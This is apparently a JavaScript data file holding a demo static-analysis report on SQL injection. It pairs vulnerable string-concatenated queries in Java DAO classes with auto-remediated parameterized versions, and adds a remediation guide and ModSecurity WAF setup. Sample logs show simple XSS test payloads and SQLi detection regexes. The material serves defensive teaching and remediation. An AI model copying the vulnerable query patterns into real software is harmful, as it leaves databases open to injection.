var jsonData = {"project": {"name": "IASP_SAST_SCAN_DEMO", "supported": {"SQL Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00382", "function": "java.sql.Statement.executeQuery()", "line": "74", "snippet": "String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username='\"+userName+\"'\";\n\n\t\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\t  \t\t \t\n\t\t\twhile (rs.next()) {", "originalCode": ["        public List<StudentSubjectGradeBean> getStudentSubjectGradeList(String userName,String datasource) throws NamingException, SQLException, Exception {", "", "                Connection conn=null;", "", "                List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();", "", "", "                /*", "                 * InitialContext ctx = new InitialContext(); DataSource ds =", "                 * (DataSource)ctx.lookup(datasource); if (ds != null) { conn =", "                 * ds.getConnection(); conn.setCatalog(datasource); }", "                 */", "", "try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "                        String dbURL = prop.getProperty(\"sec_db_url\");", "                        String dbuser = prop.getProperty(\"sec_user\");", "                        String dbpwd = prop.getProperty(\"sec_password\");", "", "                        conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);", "", "                     Statement stmt = conn.createStatement();", "                     String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username='\"+userName+\"'\";", "", "                        ResultSet rs = stmt.executeQuery(sql);", "", "                        while (rs.next()) {", "                                StudentSubjectGradeBean studDtl = new StudentSubjectGradeBean();", "                                studDtl.setId(rs.getInt(\"ID\"));", "                                studDtl.setSubjectID(rs.getString(\"SubjectID\"));", "                                studDtl.setGrade(rs.getInt(\"ID\"));", "                                studDtl.setInstructorID(rs.getString(\"InstructorID\"));", "                                studDtl.setUserName(rs.getString(\"Username\"));", "", "                                studGradeList.add(studDtl);", "                        }", "} catch(Exception e) {", "        throw e;", "}", "", "                return studGradeList;", "", "        }"], "remediatedCode": ["        public List<StudentSubjectGradeBean> getStudentSubjectGradeList(String userName,String datasource) throws NamingException, SQLException, Exception {", "", "                Connection conn=null;", "", "                List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();", "", "", "                /*", "                 * InitialContext ctx = new InitialContext(); DataSource ds =", "                 * (DataSource)ctx.lookup(datasource); if (ds != null) { conn =", "                 * ds.getConnection(); conn.setCatalog(datasource); }", "                 */", "", "try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "                        String dbURL = prop.getProperty(\"sec_db_url\");", "                        String dbuser = prop.getProperty(\"sec_user\");", "                        String dbpwd = prop.getProperty(\"sec_password\");", "", "                        conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);", "", "                     PreparedStatement stmt = null;", "                     // *******************************************************************************", "                     // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 , ", "                     // Vulnerability ID: IN00382", "                     // *******************************************************************************", "                     HashMap<String,String> IN00382_paramList = new HashMap();", "                     // *******************************************************************************", "                     // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 , ", "                     // Vulnerability ID: IN00382", "                     // Strategy in use: Parametrized query for PreparedStatement - concatenated string", "                     // Please check that the Table Names and Column Names can not be parameterized.", "                     // *******************************************************************************", "                     String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username=\" + \" ? \" + \"\";", "                     IN00382_paramList.put(\"1\",userName);", "", "                        stmt = conn.prepareStatement(sql);", "                        // *******************************************************************************", "                        // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 , ", "                        // Vulnerability ID: IN00382", "                        // Strategy in use: Parametrized query", "                        // *******************************************************************************", "                        for(HashMap.Entry<String,String> entry : IN00382_paramList.entrySet()){", "                            stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());", "                        }", "                        ResultSet rs = stmt.executeQuery();", "", "                        while (rs.next()) {", "                                StudentSubjectGradeBean studDtl = new StudentSubjectGradeBean();", "                                studDtl.setId(rs.getInt(\"ID\"));", "                                studDtl.setSubjectID(rs.getString(\"SubjectID\"));", "                                studDtl.setGrade(rs.getInt(\"ID\"));", "                                studDtl.setInstructorID(rs.getString(\"InstructorID\"));", "                                studDtl.setUserName(rs.getString(\"Username\"));", "", "                                studGradeList.add(studDtl);", "                        }", "} catch(Exception e) {", "        throw e;", "}", "", "                return studGradeList;", "", "        }"]}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00383", "function": "java.sql.Statement.executeUpdate()", "line": "326", "snippet": "Statement stmt = conn.createStatement();\n\t\t\tstmt.executeUpdate(insertSql);\n\n\t\t\t} catch (SQLException e) {", "originalCode": ["          public UserProfileForm addUserProfile(UserProfileForm userProfile) {", "", "                        /*", "                         * EntityManager em=entityManagerFactory.createEntityManager();", "                         *", "                         * UserProfileEntity entity = new UserProfileEntity();", "                         * BeanUtils.copyProperties(userProfile, entity);", "                         *", "                         * em.getTransaction().begin(); em.persist(entity);", "                         * em.getTransaction().commit();", "                         */", "          Connection conn = null;", "          String uName = userProfile.getUserName();", "          String password = userProfile.getPwd();", "          String encryptionkey = userProfile.getEncryptionKey();", "", "          String insertSql = \"Insert into UserProfile (username, password, encryptionkey) values ('\"+uName+\"','\"+password+\"','\"+encryptionkey+\"')\";", "", "                try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "                        String dbURL = prop.getProperty(\"sec_db_url\");", "                        String dbuser = prop.getProperty(\"sec_user\");", "                        String dbpwd = prop.getProperty(\"sec_password\");", "", "                        conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);", "", "                        Statement stmt = conn.createStatement();", "                        stmt.executeUpdate(insertSql);", "", "                        } catch (SQLException e) {", "                                e.printStackTrace();", "                        } catch (IOException e) {", "                                e.printStackTrace();", "                        }", "", "          return userProfile;", "          }"], "remediatedCode": ["          public UserProfileForm addUserProfile(UserProfileForm userProfile) {", "", "                        /*", "                         * EntityManager em=entityManagerFactory.createEntityManager();", "                         *", "                         * UserProfileEntity entity = new UserProfileEntity();", "                         * BeanUtils.copyProperties(userProfile, entity);", "                         *", "                         * em.getTransaction().begin(); em.persist(entity);", "                         * em.getTransaction().commit();", "                         */", "          Connection conn = null;", "          String uName = userProfile.getUserName();", "          String password = userProfile.getPwd();", "          String encryptionkey = userProfile.getEncryptionKey();", "", "          // *******************************************************************************", "          // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 , ", "          // Vulnerability ID: IN00383", "          // *******************************************************************************", "          HashMap<String,String> IN00383_paramList = new HashMap();", "          // *******************************************************************************", "          // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 , ", "          // Vulnerability ID: IN00383", "          // Strategy in use: Parametrized query for PreparedStatement - concatenated string", "          // Please check that the Table Names and Column Names can not be parameterized.", "          // *******************************************************************************", "          String insertSql = \"Insert into UserProfile (username, password, encryptionkey) values (\" + \" ? \" + \",\" + \" ? \" + \",\" + \" ? \" + \")\";", "          IN00383_paramList.put(\"1\",uName);", "          IN00383_paramList.put(\"2\",password);", "          IN00383_paramList.put(\"3\",encryptionkey);", "", "                try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "                        String dbURL = prop.getProperty(\"sec_db_url\");", "                        String dbuser = prop.getProperty(\"sec_user\");", "                        String dbpwd = prop.getProperty(\"sec_password\");", "", "                        conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);", "", "                        PreparedStatement stmt = null;", "                        stmt = conn.prepareStatement(insertSql);", "                        // *******************************************************************************", "                        // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 , ", "                        // Vulnerability ID: IN00383", "                        // Strategy in use: Parametrized query", "                        // *******************************************************************************", "                        for(HashMap.Entry<String,String> entry : IN00383_paramList.entrySet()){", "                            stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());", "                        }", "                        stmt.executeUpdate();", "", "                        } catch (SQLException e) {", "                                e.printStackTrace();", "                        } catch (IOException e) {", "                                e.printStackTrace();", "                        }", "", "          return userProfile;", "          }"]}]}], "remediation": {"remediation": {"@id": "R.0023", "@name": "SQL Injection", "@dateLastModified": "7/8/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Login(AccountVM account)\n        {\n            if(ModelState.IsValid){\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n               <em class=\"red\"> string query = &quot;Select Password from dbo.Account Where Username='&quot; + account.Username + &quot;';&quot;;</em>\n                SqlCommand cmd = new SqlCommand(query, conn);\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "nonvulncode": "[HttpPost]\n[ValidateAntiForgeryToken]\npublic ActionResult Login(AccountVM account)\n{\n    if(ModelState.IsValid){\n\n        SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n         <em class=\"blue\">string query = &quot;Select Password from dbo.Account Where Username=@username;&quot;;</em>\n         SqlCommand cmd = new SqlCommand(query, conn);\n         <em class=\"blue\">cmd.Parameters.AddWithValue(&quot;@username&quot;, account.Username);</em>\n         conn.Open();\n         using (SqlDataReader dr = cmd.ExecuteReader())\n         {\n            if (dr.Read())\n            {\n                 if(DBNull.Value != dr[&quot;Password&quot;])\n                 {\n                      if(dr[&quot;Password&quot;].ToString() == account.Password)\n                      {\n                           Session[&quot;user&quot;] = account.Username;\n                           return View(&quot;Main&quot;);\n                      }\n                 }\n            }\n         }\n         conn.Close();\n      }\n      TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n      return View();\n}", "comments": "Parametrized query is usually recommended to solve SQLi vulnerabilities, due to the fact that the data and logic will be treated in separate channels by the DB server. Confidential information needs to be protected.", "impact": "For complex queries, validate with the DBA the performance impact in the overall DB.", "abstract": "Use of parametrized query"}, {"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Login(AccountVM account)\n        {\n            if(ModelState.IsValid){\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n               <em class=\"red\"> string query = &quot;Select Password from dbo.Account Where Username='&quot; + account.Username + &quot;';&quot;;</em>\n                SqlCommand cmd = new SqlCommand(query, conn);\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "nonvulncode": "[HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Login(AccountVM account)\n        {\n            if(ModelState.IsValid){\n\n<em class=\"blue\">                var acct = context.Accounts.Where(s =&gt; s.Username == account.Username.ToString().Trim()).FirstOrDefault();</em>\n                if (acct != null)\n                {\n                    if(acct.Password == account.Password){\n                        Session[&quot;user&quot;] = account.Username;\n                        return View(&quot;Main&quot;);\n                    }\n                }\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "comments": "The use of some ORM objects, in particular entity framework using LINQ language  helps to stop SQL injection because it passes data to the database via SQL parameters instead of control layer. LINQ queries are not possible to manipulate using the traditional concatenation of SQL scape characters (e.g. the single quote ' ), making it protected against traditional SQL injection attacks. \nReferences: https://entityframework.net/linq-prevent-sql-injection", "impact": "Needs to import Entity Framework to compile the code.\nFor complex queries, validate with the DBA the performance impact in the overall DB.\n\nThis has to be properly implemented to avoid SQLi. For examples of wrong implementation, see reference: https://bertwagner.com/2018/03/06/2-5-ways-your-orm-will-allow-sql-injection/", "abstract": "Use of entity framework"}, {"@type": "JAVA/JSP", "vulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"red\">String hql =&quot;SELECT pwd from UserAccountEntity WHERE userName='&quot;+uName+&quot;'&quot;; </em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t\n\t\tList&lt;Object[]&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tObject[] user = (Object[]) it.next();\n\n\t\t\t\tif (password.equals((String) user[0])) {\n\t\t\t\t\tloginBean.setRoleID((String) user[1]);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "nonvulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"blue\">String hql =&quot;SELECT pwd from UserAccountEntity WHERE userName = :name&quot;; </em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t<em class=\"blue\">query.setParameter(&quot;name&quot;, uName); </em>\n\t\tList&lt;Object[]&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tObject[] user = (Object[]) it.next();\n\n\t\t\t\tif (password.equals((String) user[0])) {\n\t\t\t\t\tloginBean.setRoleID((String) user[1]);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "comments": "Parametrized query is usually recommended to solve SQLi vulnerabilities, due to the fact that the data and logic will be treated in separate channels by the DB server. Confidential information needs to be protected.", "impact": "For complex queries, validate with the DBA the performance impact in the overall DB.", "abstract": "Use of parametrized query"}, {"@type": "JAVA/JSP", "vulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"red\">String hql =&quot;SELECT pwd from UserAccountEntity WHERE userName='&quot;+uName+&quot;'&quot;; </em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t\n\t\tList&lt;Object[]&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tObject[] user = (Object[]) it.next();\n\n\t\t\t\tif (password.equals((String) user[0])) {\n\t\t\t\t\tloginBean.setRoleID((String) user[1]);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "nonvulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"blue\">CriteriaBuilder cb = em.getCriteriaBuilder();\n\tCriteriaQuery&lt;UserAccountEntity&gt; cr = cb.createQuery(UserAccountEntity.class);\n\tRoot&lt;UserAccountEntity&gt; root = cr.from(UserAccountEntity.class);\n\tcr.select(root).where(cb.equal(root.get(&quot;userName&quot;), uName));</em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(<em class=\"blue\">cr</em>);\n\t\tList&lt;<em class=\"blue\">UserAccountEntity</em>&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\t<em class=\"blue\">UserAccountEntity</em> user = <em class=\"blue\">(UserAccountEntity</em>) it.next();\n\n\t\t\t\tif (password.equals((String) <em class=\"blue\">user.getPwd()</em>)) {\n\t\t\t\t\tloginBean.setRoleID((String) <em class=\"blue\">user.getRoleID()</em>);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "comments": "The use of ORM objects, helps to stop SQL injection because it passes data to the database via SQL parameters instead of control layer. Queries are not possible to manipulate using the traditional concatenation of SQL scape characters (e.g. the single quote ' ), making it protected against traditional SQL injection attacks. \nReferences: \nhttps://developer.ibm.com/articles/j-typesafejpa/\nhttps://docs.oracle.com/javaee/6/tutorial/doc/gjivm.html\nhttps://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-hibernate\nhttps://www.baeldung.com/sql-injection\nhttps://snyk.io/blog/sql-injection-orm-vulnerabilities/", "impact": "Primary advantage of using criteria API is , data can be manipulated without using any hard coded SQL/HQL.", "abstract": "Use of criteria API"}, {"@type": "SQL Stored Procedure", "vulncode": "private static string HelpdeskKPICalculation(SqlConnection con, SqlCommand cmd, int dashboardSize)\n        {\n            string jsonResult;\n            cmd.CommandText = &quot;<em class=\"red\">DS_Helpdesk_KPI</em>&quot; + (dashboardSize + 1);\n            using (SqlDataAdapter sda = new SqlDataAdapter(cmd))\n            {\n                DataTable dt = new DataTable();\n                sda.Fill(dt);\n                jsonResult = JsonConvert.SerializeObject(dt);\n            }\n            return jsonResult;\n        }", "nonvulncode": null, "comments": null, "impact": "Reference https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/", "abstract": "Use of stored procedure"}, {"@type": "PL/SQL", "vulncode": null, "nonvulncode": null, "comments": null, "impact": null, "abstract": null}, {"@type": "Android", "vulncode": "Public Cursor query(@Nullable Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) {\n                                Log.d(TAG,\\&quot;query Uri = \\&quot;+uri.toString());\n        SQLiteDatabase db = dbHelper.getWritableDatabase(getContext());\n \n        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();\n        queryBuilder.setTables(SeiDbStructure.HistoryTable.HISTORY_TABLE_NAME);\n \n        uriMatcher.match(uri);\n \n       <em class=\"red\"> return queryBuilder.query(db, projection, selection, selectionArgs, null, null, sortOrder);</em>\n    }", "nonvulncode": "Public Cursor query(@Nullable Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) {\n                                Log.d(TAG,\\&quot;query Uri = \\&quot;+uri.toString());\n        SQLiteDatabase db = dbHelper.getWritableDatabase(getContext());\n \n        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();\n        queryBuilder.setTables(SeiDbStructure.HistoryTable.HISTORY_TABLE_NAME);\n\t\t\n\t\t//sample selection: columnName = ? AND columnName &gt; ?\n\t\t<em class=\"blue\">queryBuilder. appendWhereEscapeString(selection)\n</em>\t\t\n        uriMatcher.match(uri);\n \n        return queryBuilder.query(db, projection,<em class=\"blue\"> null</em>, selectionArgs, null, null, sortOrder);\n    }", "comments": "Sanitizing where clause part of the query by html encoding the where clause to avoid sql injection via appendWhereEscapeString function. One thing to note is that the where clause should be created where the actual values are separated from the acutal where clause. See example below.\n\nExample:\nString selection = &quot;columnName1 = ? AND columnName2 = ?&quot;\nString[] selectionArgs = {&quot;value1&quot;, &quot;value2&quot;}", "impact": "No impact", "abstract": "Use of appendWhereEscapeString for sqlite query builder."}]}, "mitigations": {"mitigation": [{"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for Input Validation attack (must be present in the rules folder)\n   - REQUEST-941-APPLICATION-ATTACK-XSS.conf \n   - REQUEST-942-APPLICATION-ATTACK-SQLI.conf \n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from eventviewer. Below is the log captured for SQL Injection.\n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;&lt;(a|abbr|acronym|address|applet|...&quot; at ARGS:Username. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;902&quot;] [id &quot;941320&quot;] [rev &quot;2&quot;] [msg &quot;Possible XSS Attack Detected - HTML Tag Handler&quot;] [data &quot;Matched Data: &lt;script&gt; found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;8&quot;] [accuracy &quot;8&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A2&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;PCI/6.5.1&quot;] [tag &quot;paranoia-level/2&quot;]\n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;(?i:([\\\\s'\\&quot;`\\\\(\\\\)]*?)([\\\\d\\\\w]++)([\\\\s'\\&quot;`\\\\(\\\\)]*?)(?:(?:=|&lt;=&gt;|r?like|sounds\\\\s+like|regexp)([\\\\s'\\&quot;`\\\\(\\\\)]*?)\\\\2|(?:!=|&lt;=|&gt;=|&lt;&gt;|&lt;|&gt;|\\\\^|is\\\\s+not|not\\\\s+like|not\\\\s+regexp)([\\\\s'\\&quot;`\\\\(\\\\)]*?)(?!\\\\2)([\\\\d\\\\w]+)))&quot; at ARGS:Username. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;] [line &quot;558&quot;] [id &quot;942130&quot;] [rev &quot;2&quot;] [msg &quot;SQL Injection Attack: SQL Tautology Detected.&quot;] [data &quot;Matched Data: script&gt;alert found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;9&quot;] [accuracy &quot;8&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-sqli&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&quot;] [tag &quot;WASCTC/WASC-19&quot;] [tag &quot;OWASP_TOP_10/A1&quot;] [tag &quot;OWASP_AppSensor/CIE1&quot;] [tag &quot;PCI/6.5.2&quot;] [tag &quot;paranoia-level/2&quot;] \n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;(?i)&lt;[^\\\\w&lt;&gt;]*(?:[^&lt;&gt;\\&quot;'\\\\s]*:)?[^\\\\w&lt;&gt;]*...&quot; at ARGS:Username. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;236&quot;] [id &quot;941160&quot;] [rev &quot;2&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;script found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;1&quot;] [accuracy &quot;8&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]\n\n\n[client 10.0.1.163] ModSecurity: Warning. detected XSS using libinjection. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;64&quot;] [id &quot;941100&quot;] [rev &quot;2&quot;] [msg &quot;XSS Attack Detected via libinjection&quot;] [data &quot;Matched Data: &lt;script&gt;alert(1)&lt;/script&gt; found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;1&quot;] [accuracy &quot;9&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]\n\n[client ] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;57&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;ALCB-749326Z-LX&quot;] [uri &quot;/Home/Login&quot;] [unique_id &quot;18014398524514369608&quot;]\n\n[client ::1] ModSecurity: Warning. detected XSS using libinjection. [file &quot;C:/Apache24/modules/mod_security2/activated_rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;59&quot;] [id &quot;941100&quot;] [msg &quot;XSS Attack Detected via libinjection&quot;] [data &quot;Matched Data: XSS data found within ARGS:arg: &lt;script&gt;alert('XSS attack!')&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;] [unique_id &quot;X2yLUvhe6vKvULdjHQIjLQAAAD8&quot;]\n\n[client ::1] ModSecurity: Warning. Pattern match &quot;(?i:(?:&lt;\\\\\\\\w[\\\\\\\\s\\\\\\\\S]*[\\\\\\\\s\\\\\\\\/]|['\\\\&quot;](?:...&quot; at ARGS:arg. [file &quot;C:/Apache24/modules/mod_security2/activated_rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;218&quot;] [id &quot;941160&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;script found within ARGS:arg: &lt;script&gt;alert('XSS attack!')&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] 